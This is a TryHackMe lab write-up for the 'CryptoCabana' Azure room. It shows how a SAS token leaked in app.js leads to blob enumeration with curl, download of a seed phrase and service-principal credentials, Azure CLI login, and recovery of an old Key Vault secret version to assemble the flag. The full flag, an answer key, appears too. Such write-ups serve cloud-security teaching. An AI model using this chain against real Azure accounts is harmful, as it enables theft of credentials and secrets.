

#  TryHackMe Writeup: CryptoCabana

> **Category:** Cloud Security / Azure
>
> **Difficulty:** Medium
>
> **Platform:** TryHackMe
>
> **Objective:** Exploit exposed Azure cloud resources to recover a sensitive backup and obtain the flag.

---

#  Introduction

Modern applications often store files, backups, and secrets in cloud platforms such as Microsoft Azure. While cloud services provide excellent scalability and security, **misconfigurations** can expose sensitive data to attackers.

In this room, we discovered an exposed Azure Storage Account, used a leaked **Shared Access Signature (SAS) token** to access cloud storage, obtained credentials for an Azure **Service Principal**, and finally abused Azure **Key Vault Secret Versioning** to recover an old secret and assemble the flag.

This walkthrough explains not only **how** each step works but also **why** it works.

---

# Attack Flow

```
Web Application
        │
        ▼
Inspect JavaScript (app.js)
        │
        ▼
Find Azure Storage Account + SAS Token
        │
        ▼
Enumerate Blob Containers
        │
        ▼
Download Sensitive Backup Files
        │
        ▼
Recover Service Principal Credentials
        │
        ▼
Authenticate to Azure
        │
        ▼
Enumerate Azure Key Vault
        │
        ▼
Recover Old Secret Version
        │
        ▼
Assemble the Flag
```

---

# Step 1 – Inspecting the JavaScript

While exploring the web application, we inspected the JavaScript source code.

Inside `app.js`, we discovered:

```javascript
const STORAGE_ACCOUNT = "cryptocabanaf5scjagc";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl...";
```

## Why is this important?

Web applications often communicate with cloud storage directly from the browser.

Instead of hardcoding storage account keys, developers commonly use **Shared Access Signatures (SAS Tokens)**.

A SAS Token is a temporary URL parameter that grants limited permissions to Azure Storage.

For example:

```
https://storageaccount.blob.core.windows.net/container/file.txt?SAS_TOKEN
```

Anyone possessing a valid SAS Token can perform the operations permitted by that token.

---

# Understanding SAS Tokens

A SAS Token contains several parameters:

```
sv
```

sv  :Storage service version.

```
ss
```

ss  :Storage services allowed.

```
sp
```

sp  :Permissions.

Examples:

```
r
```

r :Read

```
w
```

w :Write

```
l
```

l :List

```
d
```

d :Delete

```
se
```

se : Expiration time.

```
sig
```

sig :Cryptographic signature proving the token is valid.

Think of a SAS Token as a temporary guest pass.

Instead of giving someone the master key to the building, you give them a badge that only opens certain doors for a limited time.

---

# Step 2 – Saving the SAS Token

We stored the token inside a shell variable.

```bash
SAS="sv=2022-11-02&ss=b&srt=sco&sp=rl..."
```

## Why?

Instead of typing a long token every time, Bash stores it in a variable.

Now we can simply use:

```bash
$SAS
```

inside commands.

This reduces typing mistakes and keeps commands clean.

---

# Step 3 – Enumerating Azure Blob Storage

We used the leaked SAS Token to enumerate Azure Storage.

```bash
curl "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&$SAS"
```

## What is Blob Storage?

Azure Blob Storage is Microsoft's object storage service.

Instead of folders and files like Windows, Azure stores:

```
Storage Account
    │
    ├── Container
    │      ├── Blob
    │      ├── Blob
    │      └── Blob
```

A **Storage Account** is like a hard drive.

A **Container** is like a folder.

A **Blob** is simply a file.

---

## What did the command do?

```
comp=list
```

tells Azure:

> "Please list every container I have permission to see."

The server responded:

```
$web
backups
vault
```

We successfully enumerated the storage account.

---

# Step 4 – Exploring the Vault Container

Next we listed the contents of the `vault` container.

```bash
curl "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&$SAS"
```

Azure returned:

```
backup-service-account.json

seed_phrase.txt
```

---

## Why is this dangerous?

Cloud storage should never expose sensitive backups.

Attackers often search cloud storage for:

* Database backups
* SSH keys
* Password files
* API keys
* Cloud credentials

Here we discovered exactly that.

---

# Step 5 – Downloading the Files

We downloaded both files.

```bash
curl -o seed_phrase.txt \
"https://cryptocabanaf5scjagc.blob.core.windows.net/vault/seed_phrase.txt?$SAS"
```

```bash
curl -o backup-service-account.json \
"https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?$SAS"
```

---

## The Seed Phrase

```
velvet cabana rebuild scatter obvious wallet drift lagoon punchline receipt orbit shrimp
```

A seed phrase is used to recover cryptocurrency wallets.

Anyone who possesses the phrase can often restore the wallet and control its funds.

---

## The Service Account

The JSON file contained:

```
Client ID

Client Secret

Tenant ID

Key Vault Name
```

These are credentials for an Azure **Service Principal**.

---

# Understanding Service Principals

A Service Principal is a non-human Azure account.

Instead of people logging in, applications use Service Principals.

Think of them as robot users.

```
Human User
      │
Logs into Azure Portal

Service Principal
      │
Application logs in automatically
```

If attackers steal these credentials, they can impersonate the application.

---

# Step 6 – Logging into Azure

We authenticated as the Service Principal.

```bash
az login \
--service-principal \
--username CLIENT_ID \
--password CLIENT_SECRET \
--tenant TENANT_ID
```

Successful login confirmed we had access.

---

# Step 7 – Azure Key Vault

Azure Key Vault securely stores:

* Secrets
* Passwords
* API Keys
* Certificates
* Encryption Keys

Applications retrieve secrets from the Key Vault instead of storing them inside source code.

---

We listed the available secrets.

```bash
az keyvault secret list \
--vault-name ccabana-kv-f5scjagc  \
--output table
```

Output:

```
key-shard-1

key-shard-2

key-shard-3

master-key
```

---

# Step 8 – Reading the Secrets

We extracted each secret.

```bash
az keyvault secret show \
--vault-name ccabana-kv-f5scjagc \
--name key-shard-1 \
--query value \
-o tsv
```

Result:

```
THM{n0t_ur
```

We repeated the process for the remaining secrets.

---

# Step 9 – The Hidden Hint

The second shard contained:

```
Rotated this after IT flagged it.
Old value should still be recoverable...
```

This was the most important clue.

---

# Understanding Secret Versioning

Azure Key Vault never overwrites a secret.

Instead:

```
Version 1

↓

Version 2

↓

Version 3
```

Each update creates a **new version**, while older versions remain stored.

This feature allows administrators to recover previous secrets.

Unfortunately, attackers can also abuse it.

---

# Step 10 – Enumerating Secret Versions

We listed every version.

```bash
az keyvault secret list-versions \
--vault-name ccabana-kv-f5scjagc \
--name key-shard-2
```

Azure returned two versions.
```
https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0
https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/c922c422ffb34671a902389c372314f1
```
We retrieved the older version.

```bash
az keyvault secret show \
--vault-name ccabana-kv-f5scjagc \
--name key-shard-2 \
--version <OLD_VERSION_ID>
```

Result:

```
_k3ys_n0t
```

---

# Step 11 – Assembling the Flag

We combined the three fragments.

```
THM{n0t_ur

_k3ys_n0t

_ur_c01ns!}
```

Final flag:

```
THM{n0t_ur_k3ys_n0t_ur_c01ns!}
```

---




# Key Concepts Learned

* Azure Storage Accounts
* Blob Containers and Blobs
* Shared Access Signature (SAS) Tokens
* Azure CLI Authentication
* Service Principals
* Azure Key Vault
* Secret Enumeration
* Secret Versioning
* Cloud Credential Exposure
* Cloud Misconfiguration

---

This room is a great example of how a **small client-side secret leak** can lead to a **complete compromise of cloud resources**. A single exposed SAS token allowed us to move step by step—from storage enumeration, to credential theft, to authenticated access, and finally to recovering historical secrets from Azure Key Vault. It demonstrates how seemingly minor cloud misconfigurations can chain together into a full attack path.
